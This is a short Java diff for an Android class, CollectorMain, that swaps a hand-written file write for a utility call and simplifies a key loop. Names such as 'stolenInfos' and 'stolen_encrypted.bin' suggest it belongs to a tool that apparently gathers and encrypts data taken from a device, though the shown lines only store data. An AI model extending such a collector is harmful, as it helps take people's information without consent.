@@ -48,19 +48,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				Log.d("CollectorMain","migrating");
 				stolenInfos = new BinaryPrefImpl(new File(getFilesDir(), "stolen.bin"));
 				stolenInfos=new HeavilyEncryptedBinaryPrefImpl(stolenInfos.getAll());
-				FileOutputStream fos=null;
-				try {
-					fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
-					fos.write(stolenInfos.toBytes());
-				} catch (IOException e) {
-					DebugWriter.writeToE("CollectorMain",e);
-					return;
-				} finally {
-					try {
-						if (fos != null)fos.close();
-					} catch (IOException e) {}
-					running = false;
-				}
+				Utils.writeToFileByBytes(new File(getFilesDir(), "stolen_encrypted.bin"),stolenInfos.toBytes());
 				new File(getFilesDir(), "stolen.bin").delete();
 				Log.d("CollectorMain","done");
 			}
@@ -139,7 +127,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				} catch (IOException e) {}
 				running = false;
 			}
-			for (String s:sb.getAll().keySet().toArray(new String[sb.getAll().size()])) {
+			for (String s:sb.getAll().keySet()) {
 				Log.d("remain", s);
 			}
 		}
